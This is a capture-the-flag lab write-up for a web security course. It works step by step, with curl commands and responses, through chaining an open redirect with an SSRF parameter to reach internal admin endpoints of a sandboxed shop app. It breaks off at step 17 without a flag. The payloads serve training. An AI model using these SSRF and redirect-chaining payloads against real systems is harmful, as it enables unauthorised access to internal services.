# Task 3. New security layers in town! Let's break 'em in and see if they hold up!


## **Task Description**


Let's see if our security makeover is more than just a fresh coat of paint! Time to poke some holes and find out!\


This challenge focuses on the SSRF vulnerability within the check reduction functionality. Despite previous vulnerabilities, we've implemented new security measures. Now, it's time to see if they've done the job.\


Your mission is to test the new security layers: Attempt to exploit the SSRF vulnerability with the implementation of new security measures.

- Target Application: [ShopAdmin](https://intranet-dlh.hbtn.io/rltoken/U6QqlviZrwI8UHYl-XSfrw)
- Initial Endpoint: `http://web0x08.hbtn/app4-1/`

---

Useful instructions:

1. Log into ShopAdmin, it is a shopping website, there is a lot of article.
2. Navigate to Check Reduction Functionality: Explore the feature where the articleApi parameter is utilized.
3. There is New Feature To Navigate Product Now Trying Exploiting The Redirection in That  Feature
4. Try Using The New Feature  as refer in your payload to  Exploit The Vulnerability
5. Pay Attention To Other API Call to Backend Services & Port 6. This App is Forwarded on Port 8080



**Repo:**

- GitHub repository: `dlh-cyber_security`
- Directory: `web_application_security/0x08_ssrf`
- File: `3-flag.txt`



## **Solution**



- Start sandbox `cyber_websec_0x08`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.

```bash
echo "10.42.254.214 web0x08.hbtn" | sudo tee -a /etc/hosts
```

## Task 3, Step 1: Identify the new redirection feature

Tasks 0, 1, and 2 are complete. This challenge introduces a different SSRF bypass technique: exploiting HTTP redirection.

The key hints are:

- The vulnerable parameter is still `articleApi`.
- A new product navigation feature has been added.
- We need to exploit its redirection behavior.
- The application uses port `8080`.

### How this attack might work

The likely vulnerability involves a server-side HTTP client following redirects.

For example:

<img src="./http_redirect.png" alt="HTTP Redirect Example" width="777"/>


The important distinction is that the initial URL can pass validation while its redirect destination points somewhere that should be blocked.

This is a hypothesis. First, we need to discover how the new feature works.

### Action

1. Open `http://web0x08.hbtn/app4-1/` in Firefox.
2. Open Developer Tools (`F12`) and select Network → All.
3. Enable Persist Logs.
4. Click a product and try the new product navigation feature, watching for requests to backend services.


<img src="./web0x08.hbtn_app4-1_check-reduction.png" alt="web0x08.hbtn_app4-1_check-reduction" width="800"/>

The request as curl command:

```bash
curl 'http://web0x08.hbtn/app4-1/check-discount' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://web0x08.hbtn' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://web0x08.hbtn/app4-1/product/2' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'articleApi=http%3A%2F%2Fweb0x08.hbtn%3A8080%2Fapp4-1%2Fcheck-discount'
```

## Task 3, Step 2: Identify the product navigation redirect

The capture reveals two important differences from the previous challenges.

| Component            | Value                                            |
| -------------------- | ------------------------------------------------ |
| SSRF endpoint        | `/app4-1/check-discount`                         |
| Vulnerable parameter | `articleApi`                                     |
| Original destination | `http://web0x08.hbtn:8080/app4-1/check-discount` |
| Application port     | `8080`                                           |
| Product page         | `/app4-1/product/2`                              |

The application now uses `check-discount` instead of `check-reduction`.

The hint specifically mentions exploiting redirection in the new product navigation feature.

Our next step is to discover the navigation URL rather than guessing an SSRF payload.

### Action: Inspect the product page's navigation links

Execute this command in Kali:

```bash
curl -sS 'http://web0x08.hbtn/app4-1/product/2' \
  | grep -Ein -C 2 'redirect|navigate|next|previous|prev|product/[0-9]|window\.location|location\.href' \
  | head -n 100
```

### Why?

This command:

- Downloads the HTML source of product 2.
- Searches for navigation links, redirect parameters, and JavaScript navigation logic.
- Displays surrounding lines to reveal how the links are constructed.

We're looking for a URL that might accept a destination parameter, such as `url`, `next`, or `redirect`.

If we find a controllable redirect endpoint, we can investigate whether `articleApi` follows its redirects without revalidating the destination.


```html
curl -sS 'http://web0x08.hbtn/app4-1/product/2' \
  | grep -Ein -C 2 'redirect|navigate|next|previous|prev|product/[0-9]|window\.location|location\.href' \
  | head -n 100

16-      <button type="submit">Check Stock</button>
17-    </form>
18:    <a href="/product/nextProduct?path=/product/3"
19:      >Next Product</a
20-    >
21-  </body>
--
275-            type="submit"
276-          >
277:            <a href="/app4-1/product/nextProduct?path=/app4-1/product/3"
278:              >Next Product</a
279-            >
280-          </button>
```


## Task 3, Step 3: Analyze the product navigation redirect

We've discovered the new feature mentioned in the challenge.

The product page contains this link:

```js
/app4-1/product/nextProduct?path=/app4-1/product/3
```

The interesting part is:

```js
path=/app4-1/product/3
```

This suggests that `/product/nextProduct` may use the user-controlled `path` parameter to determine where to redirect.

Our hypothesis: We can potentially turn this endpoint into an open redirect, then use it to bypass the SSRF protections on `articleApi`.

### Action: Inspect the redirect response

Execute this command in Kali:

```bash
curl -sS -i 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/app4-1/product/3' | head -n 30
```

### Why?

We want to identify whether the endpoint returns an HTTP redirect.

A typical response would look like:

```
HTTP/1.1 302 Found
Location: /app4-1/product/3
```

The `Location` header is especially important because it tells us where the server directs the HTTP client.

Notice that we're deliberately not using `curl -L`. That option automatically follows redirects, whereas we want to inspect the original response.

If this endpoint redirects according to the `path` parameter, our next step will be to test whether that parameter accepts an absolute URL pointing to an internal service.


```bash
curl -sS -i 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/app4-1/product/3' | head -n 30

# HTTP/1.1 302 Found
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 20:33:16 GMT
# Content-Type: text/plain; charset=utf-8
# Content-Length: 39
# Connection: keep-alive
# X-Powered-By: Express
# Location: /app4-1/product/3
# Vary: Accept
#
# Found. Redirecting to /app4-1/product/3
```

## Task 3, Step 4: Test for an open redirect

Excellent. We've confirmed that the new product navigation endpoint returns:

```yaml
HTTP/1.1 302 Found
Location: /app4-1/product/3
```

This means the application uses an HTTP redirect based on the `path` parameter.

Now we need to establish whether it accepts absolute URLs, not just relative paths.

### Action: Test redirection to localhost

Execute this command in Kali:

```bash
curl -sS -i -G \
  --data-urlencode 'path=http://127.0.0.1:8080/app4-1/admin/list-of-items' \
  'http://web0x08.hbtn/app4-1/product/nextProduct'
```

### Why?

We're attempting to change the redirect destination from:

```yaml
/app4-1/product/3
```

to:

```yaml
http://127.0.0.1:8080/app4-1/admin/list-of-items
```

If the application responds with:

```yaml
HTTP/1.1 302 Found
Location: http://127.0.0.1:8080/app4-1/admin/list-of-items
```

we've demonstrated that the endpoint permits redirects to arbitrary absolute URLs.

That would give us a potential SSRF bypass chain:

1. Submit an allowed URL to `articleApi`.
2. Have that URL invoke the `nextProduct` redirect.
3. Redirect the server-side HTTP client to an internal admin endpoint.

The critical question is whether the SSRF client follows the redirect without revalidating its destination.


```bash
curl -sS -i -G \
  --data-urlencode 'path=http://127.0.0.1:8080/app4-1/admin/list-of-items' \
  'http://web0x08.hbtn/app4-1/product/nextProduct'

# HTTP/1.1 302 Found
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 20:40:35 GMT
# Content-Type: text/plain; charset=utf-8
# Content-Length: 70
# Connection: keep-alive
# X-Powered-By: Express
# Location: http://127.0.0.1:8080/app4-1/admin/list-of-items
# Vary: Accept
#
# Found. Redirecting to http://127.0.0.1:8080/app4-1/admin/list-of-items
```

## Task 3, Step 5: Chain the open redirect with SSRF

We've confirmed that `/app4-1/product/nextProduct` is vulnerable to an open redirect.

The server returned:

```yaml
HTTP/1.1 302 Found
Location: http://127.0.0.1:8080/app4-1/admin/list-of-items
```

Now we'll combine this with the SSRF vulnerability in `articleApi`.

### Action: Execute this command in Kali

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=http://127.0.0.1:8080/app4-1/admin/list-of-items'
```

### Why this should work

The payload creates a two-stage request:

STAGE 1: INITIAL SSRF REQUEST

`http://web0x08.hbtn:8080/app4-1/product/nextProduct`

Uses the hostname and port found in the original `articleApi` request.

STAGE 2: REDIRECT RESPONSE

`302 Found`

The `path` parameter controls the destination.

STAGE 3: INTERNAL TARGET

`http://127.0.0.1:8080/app4-1/admin/list-of-items`

The HTTP client may follow the redirect to the internal admin page.

The security weakness we're testing: Whether the SSRF filter validates only the initial URL rather than every redirect destination.

If successful, the response should contain the admin items HTML and potentially `FLAG_3`.


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=http://127.0.0.1:8080/app4-1/admin/list-of-items'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 20:45:57 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 28
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"1c-+CuxaX+7SlQm4ks++a9ZSmAz1Hk"
#
# Error fetching discount data


curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=http://127.0.0.1:8080/app4-1/admin/dashboard'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 20:46:33 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 28
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"1c-+CuxaX+7SlQm4ks++a9ZSmAz1Hk"
#
# Error fetching discount data
```


## Task 3, Step 6: Investigate the backend service and its port

All payloads returned the same response:

```yaml
HTTP/1.1 200 OK

Error fetching discount data
```

This tells us that the request failed somewhere in the SSRF processing chain, but it doesn't establish whether the redirect was blocked or the destination was unreachable.

One important clue from the challenge: "Pay Attention To Other API Call to Backend Services & Port."

In your earlier HTML output, we also saw a Check Stock button. That may expose another backend endpoint or internal service port.

### Action: Inspect the Check Stock form

Execute this command in Kali:

```bash
curl -sS 'http://web0x08.hbtn/app4-1/product/2' | head -n 45
```

### Why?

We want to identify:

1. The endpoint used by the Check Stock feature.
2. Any hostname or port associated with its backend service.
3. Whether its request parameters reveal another internal API.

The key distinction is that port 8080 might be the storefront's forwarded port, while the admin service could use a different port.

If that's the case, our open redirect may work, but we're redirecting to the wrong destination.

```html
curl -sS 'http://web0x08.hbtn/app4-1/product/2' | head -n 45

<!-- <!DOCTYPE html>
<html>
  <head>
    <title>Sample Product 2 - Product Page</title>
  </head>
  <body>
    <h1>Sample Product 2</h1>
    <p>This is a sample product.</p>
    <p>Price: $9.99</p>
    <form action="/check-stock" method="post">
      <input
        type="hidden"
        name="stockApi"
        value="http://internal-api.checkstock.shop/2"
      />
      <button type="submit">Check Stock</button>
    </form>
    <a href="/product/nextProduct?path=/product/3"
      >Next Product</a
    >
  </body>
</html> -->
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="format-detection" content="telephone=no" />
    <title>AllStore - MultiConcept eCommerce Template</title>

    <link
      href="https://fonts.googleapis.com/css?family=PT+Serif:400,400i,700,700ii%7CRoboto:300,300i,400,400i,500,500i,700,700i,900,900i&amp;subset=cyrillic"
      rel="stylesheet"
    />

    <link rel="stylesheet" href="../css/font-awesome.min.css" />
    <link rel="stylesheet" href="../css/bootstrap.min.css" />
    <link rel="stylesheet" href="../css/ion.rangeSlider.css" />
    <link rel="stylesheet" href="../css/ion.rangeSlider.skinFlat.css" />
    <link rel="stylesheet" href="../css/jquery.bxslider.css" />
    <link rel="stylesheet" href="../css/jquery.fancybox.css" />
    <link rel="stylesheet" href="../css/flexslider.css" />
    <link rel="stylesheet" href="../css/swiper.css" />
    <link rel="stylesheet" href="../css/style.css" />

```

## Task 3, Step 7: Identify the actual Check Stock backend

The output reveals something interesting:

```html
<form action="/check-stock" method="post">
  <input
    type="hidden"
    name="stockApi"
    value="http://internal-api.checkstock.shop/2"
  />
</form>
```

However, this code is inside an HTML comment, so it may be leftover development code rather than the active implementation.

We need to inspect the real form further down the page.

### Action: Find all backend API references

Execute this command in Kali:

```
curl -sS 'http://web0x08.hbtn/app4-1/product/2' \
  | grep -n -C 6 -E 'stockApi|check-stock|articleApi|check-discount|nextProduct'
```

### Why?

This will reveal the active HTML around both features:

- Check Stock: May expose a different backend hostname or port.
- Check Discount: Shows the SSRF parameter and its expected destination.
- Next Product: Provides the redirect mechanism we've already confirmed.

Our previous SSRF payloads returned `Error fetching discount data`. One possibility is that we're redirecting to the wrong internal service or port.

The next step is to establish the actual backend destinations before changing the payload again.


```html
curl -sS 'http://web0x08.hbtn/app4-1/product/2' \
  | grep -n -C 6 -E 'stockApi|check-stock|articleApi|check-discount|nextProduct'

4-    <title>Sample Product 2 - Product Page</title>
5-  </head>
6-  <body>
7-    <h1>Sample Product 2</h1>
8-    <p>This is a sample product.</p>
9-    <p>Price: $9.99</p>
10:    <form action="/check-stock" method="post">
11-      <input
12-        type="hidden"
13:        name="stockApi"
14-        value="http://internal-api.checkstock.shop/2"
15-      />
16-      <button type="submit">Check Stock</button>
17-    </form>
18:    <a href="/product/nextProduct?path=/product/3"
19-      >Next Product</a
20-    >
21-  </body>
22-</html> -->
23-<!DOCTYPE html>
24-<html lang="en">
--
236-                  ><i class="fa fa-angle-down"></i
237-                ></a>
238-              </p>
239-              <p class="prod-addwrap">
240-                <a href="#" class="prod-add" rel="nofollow">Add </a>
241-              </p>
242:              <form action="/app4-1/check-discount" method="post">
243-                <input
244-                  type="hidden"
245:                  name="articleApi"
246:                  value="http://web0x08.hbtn:8080/app4-1/check-discount"
247-                />
248-                <button class="prod-add" type="submit">Check Reduction</button>
249-              </form>
250-            </div>
251-            <ul class="prod-i-props">
252-              <li><b>SKU</b> 05464207</li>
--
271-              color: white;
272-              padding: 10px;
273-            "
274-            class="prod-add"
275-            type="submit"
276-          >
277:            <a href="/app4-1/product/nextProduct?path=/app4-1/product/3"
278-              >Next Product</a
279-            >
280-          </button>
281-
282-          <!-- Product Tabs -->
283-          <div class="prod-tabs-wrap">
```


## Task 3, Step 8: Verify that SSRF can reach the application on port 8080

The output confirms two things:

1. The active Check Reduction form uses `articleApi=http://web0x08.hbtn:8080/app4-1/check-discount`.
2. The `stockApi` reference is inside an HTML comment, so it isn't part of the active interface.

We also know the `nextProduct` endpoint permits arbitrary redirects, but our previous SSRF payload returned `Error fetching discount data`.

Before changing the redirect destination, we should verify that the SSRF functionality can retrieve a known, valid page on port `8080`.

### Action: Test a direct SSRF request to the product page

Execute:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/product/2' \
  | awk 'NR <= 20 {print}'
```

### Why?

We're testing a destination that we know exists, without involving redirects or localhost.

This helps isolate where the previous payload failed.

| Result                                        | Interpretation                                             |
| --------------------------------------------- | ---------------------------------------------------------- |
| HTML containing `AllStore` or product details | SSRF can fetch the application on port 8080                |
| `Error fetching discount data`                | The backend cannot fetch this URL, or rejects its response |
| `Invalid hostname`                            | The hostname validation is rejecting the destination       |

The `awk` command limits displayed output while still consuming the full HTTP response.

Your turn: Paste the output. Based on that result, we'll determine whether to investigate redirect handling or the backend destination.

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/product/2' \
  | awk 'NR <= 20 {print}'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 21:52:53 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```


## Task 3, Step 9: Verify whether the SSRF client follows redirects

Good result! The backend returned:

```yaml
HTTP/1.1 200 OK

No discount.
```

This differs from the previous response:

```yaml
Error fetching discount data
```

It suggests the backend can process requests to `web0x08.hbtn:8080`, but our redirect to `127.0.0.1:8080` encountered a problem.

We need to distinguish between two possibilities:

1. The SSRF client doesn't follow HTTP redirects.
2. The SSRF client follows redirects, but `127.0.0.1:8080` is unreachable or blocked.

### Action: Test a redirect to a known reachable URL

Execute this command:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=http://web0x08.hbtn:8080/app4-1/product/2'
```

### Why?

We're creating this request chain:

```
POST /app4-1/check-discount
    |
    v
GET /app4-1/product/nextProduct
    |
    | HTTP 302
    v
GET http://web0x08.hbtn:8080/app4-1/product/2
```

Unlike our previous test, both the initial URL and the redirect destination use a hostname and port that the application has already accepted.

Expected results:

- `No discount.` suggests the backend successfully followed the redirect and processed the product page.
- `Error fetching discount data` suggests a problem with redirect handling or the resulting request.


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=http://web0x08.hbtn:8080/app4-1/product/2'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 21:58:10 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 28
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"1c-+CuxaX+7SlQm4ks++a9ZSmAz1Hk"
#
# Error fetching discount data
```


## Task 3, Step 10: Test a relative redirect

The response is still:

```yaml
HTTP/1.1 200 OK

Error fetching discount data
```

This is interesting because requesting `/app4-1/product/2` directly returned `No discount.`

We now know that:

- The direct product URL is accepted by `articleApi`.
- The `nextProduct` endpoint generates HTTP 302 redirects.
- Passing an absolute redirect through `articleApi` produces an error.

However, we haven't established whether the problem is redirect handling itself or the absolute redirect destination.

### Action: Test a relative redirect

Execute:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=/app4-1/product/2'
```

### Why?

This time, we're using a relative destination:

```
/app4-1/product/2
```

instead of:

```
http://web0x08.hbtn:8080/app4-1/product/2
```

This isolates one important variable: the redirect destination's URL format.

| Response                       | Possible interpretation                                                                                |
| ------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `No discount.`                 | Relative redirects work, suggesting absolute redirects are treated differently                         |
| `Error fetching discount data` | Redirect processing itself may be failing, or the navigation endpoint behaves differently on port 8080 |
| `Invalid hostname`             | URL validation is rejecting the request                                                                |

One additional detail: the outer `HTTP 200` comes from `/check-discount`, so it doesn't tell us whether the internal redirect succeeded.


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=/app4-1/product/2'

HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 09 Nov 2026 23:03:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 28
Connection: keep-alive
X-Powered-By: Express
ETag: W/"1c-+CuxaX+7SlQm4ks++a9ZSmAz1Hk"

Error fetching discount data
```

## Task 3, Step 11: Inspect redirect behavior on port 8080

The relative redirect also returned:

```
Error fetching discount data
```

We now have an interesting pattern:

| SSRF destination            | Result                         |
| --------------------------- | ------------------------------ |
| Direct `/app4-1/product/2`  | `No discount.`                 |
| Redirect to an absolute URL | `Error fetching discount data` |
| Redirect to a relative path | `Error fetching discount data` |

This suggests that the problem may be related to HTTP redirect handling, rather than the particular admin endpoint.

However, there's one detail we haven't verified: our earlier successful `302 Found` response came from port 80, whereas `articleApi` sends requests to port 8080.

### Action: Inspect the redirect directly on port 8080

Execute this command in Kali:

```bash
curl -sS -i --max-time 10 \
  'http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=/app4-1/product/2'
```

### Why?

We want to establish whether the navigation endpoint behaves identically on port 8080.

There are three possibilities:

- `302 Found` with a valid `Location` header: The redirect endpoint works on port 8080, so we can focus on why the SSRF client fails to process its response.
- `404` or another HTTP error: The endpoint may be routed differently on the backend port.
- Connection error or timeout: Port 8080 may be reachable only from within the lab's server network.

Importantly, we are not using `-L` because we want to examine the redirect itself, not automatically follow it.


```bash
curl -sS -i --max-time 10 \
  'http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=/app4-1/product/2'

# HTTP/1.1 403 Forbidden
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
# Date: Mon, 09 Nov 2026 23:09:55 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# Forbidden
```

## Task 3, Step 12: Test SSRF through port 80

An important gap in our testing: We've been using port 8080 for every SSRF redirect attempt, even though we confirmed the open redirect works on port 80.


### What we've established

| Endpoint                                       | Direct response |
| ---------------------------------------------- | --------------- |
| `web0x08.hbtn/app4-1/product/nextProduct`      | `302 Found`     |
| `web0x08.hbtn:8080/app4-1/product/nextProduct` | `403 Forbidden` |

We should verify that `articleApi` can access the application through port 80 before attempting another redirect chain.

### Action: Execute this command in Kali

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/2'
```

### Why?

The only meaningful change from our successful direct SSRF test is the removal of `:8080`.

Previously:

```yaml
http://web0x08.hbtn:8080/app4-1/product/2
```

Now:

```yaml
http://web0x08.hbtn/app4-1/product/2
```

We want to determine whether the SSRF filter permits requests to the same hostname on the default HTTP port.

Possible outcomes:

- `No discount.`: Port 80 is accessible through the SSRF functionality. We can then test the redirect chain on that port.
- `Invalid hostname` or another validation error: The filter may enforce a specific destination port.
- `Error fetching discount data`: The request failed, but we'll need to investigate why.

> Note: The reference to `internal-api.checkstock.shop` is also worth keeping in mind, although it comes from commented-out HTML and we haven't confirmed it is an active service.

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/2'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 23:19:51 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```

## Task 3, Step 13: Test the redirect chain through port 80

Excellent. We have now confirmed that `articleApi` accepts requests to `web0x08.hbtn` on port 80.

The response:

```yaml
HTTP/1.1 200 OK

No discount.
```

establishes that the application can process the URL without specifying `:8080`.

Our previous attempts used the redirect endpoint on port 8080, where direct requests returned `403 Forbidden`. Now we can test the redirect endpoint on the port where we've observed it returning `302 Found`.

### Action: Execute this command in Kali

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=/app4-1/product/2'
```

### Why?

We're testing the following chain:

```yaml
POST /app4-1/check-discount
           |
           v
GET http://web0x08.hbtn/app4-1/product/nextProduct
           |
           | 302 Found
           | Location: /app4-1/product/2
           v
GET http://web0x08.hbtn/app4-1/product/2
```

This test isolates redirect handling from internal-host access.

| Response                       | Interpretation                                                      |
| ------------------------------ | ------------------------------------------------------------------- |
| `No discount.`                 | Strong evidence that the SSRF client follows redirects successfully |
| `Error fetching discount data` | Redirect processing is still failing                                |
| `Invalid hostname`             | The request is being rejected by URL validation                     |

If this succeeds, our next step will be replacing the harmless product destination with an internal target.

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=/app4-1/product/2'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 23:23:29 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 28
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"1c-+CuxaX+7SlQm4ks++a9ZSmAz1Hk"
#
# Error fetching discount data
```

## Task 3, Step 14: Test direct access to the admin endpoint

The latest result is:

```yaml
HTTP/1.1 200 OK
Error fetching discount data
```

This is useful because we now have:

| Request through `articleApi`          | Result                         |
| ------------------------------------- | ------------------------------ |
| Direct product page, port 80          | `No discount.`                 |
| Direct product page, port 8080        | `No discount.`                 |
| Redirect via `nextProduct`, port 80   | `Error fetching discount data` |
| Redirect via `nextProduct`, port 8080 | `Error fetching discount data` |

Our redirect hypothesis remains unconfirmed. The error could mean the SSRF client rejects redirects, fails to follow them, or encounters another downstream error.

Before investigating more complex redirect bypasses, let's establish whether the admin endpoint is accessible directly through an accepted hostname, as it was in Task 2.

### Action: Test the admin endpoint directly on port 80

Execute:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/admin/list-of-items'
```

### Why?

This isolates the admin endpoint from the redirection mechanism.

- If we receive `FLAG_3`, the hostname is allowed and direct internal path access remains exploitable.
- If we receive `Forbidden`, `Invalid hostname`, or `Error fetching discount data`, we'll have evidence that direct access is restricted or fails.
- If we receive `No discount.`, the request may have succeeded without exposing the admin content, so we'll need to investigate how the response is processed.

This test also helps us avoid assuming that the admin route and protections are identical to previous tasks.


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/admin/list-of-items'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 23:26:30 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```

## Task 3, Step 15: Check how the admin endpoint is protected

The latest response was:

```yaml
HTTP/1.1 200 OK

No discount.
```

This is different from the redirect attempts, which consistently returned `Error fetching discount data`.

Important distinction: `No discount.` does not necessarily mean the admin endpoint was successfully accessed. The application may return that message whenever a backend request completes without finding valid discount data.

We need to establish what the admin endpoint actually returns when requested directly.

### Action: Inspect the admin endpoint

Execute this command in Kali:

```bash
curl -sS -i 'http://web0x08.hbtn/app4-1/admin/list-of-items' | head -n 35
```

### Why?

This will help us distinguish between three possibilities:

| Response                 | Interpretation                          |
| ------------------------ | --------------------------------------- |
| `403 Forbidden`          | Direct access is restricted             |
| `404 Not Found`          | The endpoint may not exist at this path |
| `200 OK` with admin HTML | The endpoint is directly accessible     |

The previous tasks used `/admin/list-of-items` to expose the flag, but Task 3 may have a different internal routing architecture.

We also need to investigate the separate `internal-api.checkstock.shop` service discovered in the commented HTML. However, first we should establish whether we're targeting an existing admin route.


```bash
curl -sS -i 'http://web0x08.hbtn/app4-1/admin/list-of-items' | head -n 35

# HTTP/1.1 404 Not Found
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 23:29:20 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 19
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"13-lDORkTXKdSQVDm93qIyu0m47NCE"
#
# 404: Page Not Found
```


## Task 3, Step 16: Check the admin route on the backend port

The latest result is:

```yaml
HTTP/1.1 404 Not Found

404: Page Not Found
```

This confirms that `/app4-1/admin/list-of-items` is not exposed through the public application on port 80.

However, we haven't established where Task 3's internal admin dashboard actually lives.

In Tasks 0 through 2, the admin resource was accessible at `/admin/list-of-items`. We've been assuming Task 3 uses the same route with an `/app4-1` prefix, which may be incorrect.

### Action: Test the unprefixed admin route on port 8080

Execute:

```bash
curl -sS -i --max-time 10 \
  'http://web0x08.hbtn:8080/admin/list-of-items'
```

### Why?

This tests two differences simultaneously:

- Port 8080: The backend port specified by the challenge.
- `/admin/list-of-items`: The original internal admin route, without `/app4-1`.

We're checking whether the backend exposes an administrative resource at a different route than the public-facing application.

| Response                 | Interpretation                                                |
| ------------------------ | ------------------------------------------------------------- |
| `200 OK` with admin HTML | We've located a candidate admin endpoint                      |
| `403 Forbidden`          | The route may be protected, but its existence isn't confirmed |
| `404 Not Found`          | The route isn't available at that address                     |
| Connection error         | Direct access to the backend may be unavailable               |

One important point: our earlier `No discount.` responses are not proof that SSRF retrieved the intended content. Likewise, the redirect failures don't conclusively establish whether redirect following is disabled.


```bash
curl -sS -i --max-time 10 \
  'http://web0x08.hbtn:8080/admin/list-of-items'

# HTTP/1.1 403 Forbidden
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
# Date: Mon, 09 Nov 2026 23:33:39 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# Forbidden
```

## Task 3, Step 17: Test an absolute redirect through port 80

